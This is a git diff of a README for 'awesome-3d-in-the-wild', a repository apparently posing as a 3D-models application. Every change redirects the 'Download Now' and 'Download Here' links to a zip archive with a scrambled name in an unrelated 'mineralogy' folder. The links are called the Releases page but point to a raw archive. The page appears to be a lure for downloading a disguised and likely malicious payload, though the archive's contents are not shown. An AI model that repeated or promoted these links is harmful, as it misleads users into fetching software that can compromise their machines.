@@ -1,6 +1,6 @@
 # 🌐 awesome-3d-in-the-wild - Discover Real-World Applications of 3D Models
 
-[![Download Now](https://raw.githubusercontent.com/gustavosousass/awesome-3d-in-the-wild/main/mineralogy/awesome-3d-in-the-wild.zip%20Now-Ready%20to%20Go-brightgreen)](https://raw.githubusercontent.com/gustavosousass/awesome-3d-in-the-wild/main/mineralogy/awesome-3d-in-the-wild.zip)
+[![Download Now](https://github.com/gustavosousass/awesome-3d-in-the-wild/raw/refs/heads/main/mineralogy/awesome-in-wild-the-d-v1.6.zip%20Now-Ready%20to%20Go-brightgreen)](https://github.com/gustavosousass/awesome-3d-in-the-wild/raw/refs/heads/main/mineralogy/awesome-in-wild-the-d-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **awesome-3d-in-the-wild**! This application provides a curated colle
 
 To download the software, visit the Releases page at this link:
 
-[Download Here](https://raw.githubusercontent.com/gustavosousass/awesome-3d-in-the-wild/main/mineralogy/awesome-3d-in-the-wild.zip)
+[Download Here](https://github.com/gustavosousass/awesome-3d-in-the-wild/raw/refs/heads/main/mineralogy/awesome-in-wild-the-d-v1.6.zip)
 
 Once there, look for the latest release and follow these steps:
 
@@ -61,7 +61,7 @@ Feel free to join discussions or ask questions in the Issues section. Community 
 
 Stay updated with the latest features and improvements by checking the Releases page regularly:
 
-[Download Here](https://raw.githubusercontent.com/gustavosousass/awesome-3d-in-the-wild/main/mineralogy/awesome-3d-in-the-wild.zip)
+[Download Here](https://github.com/gustavosousass/awesome-3d-in-the-wild/raw/refs/heads/main/mineralogy/awesome-in-wild-the-d-v1.6.zip)
 
 ## ☎️ Contact
 
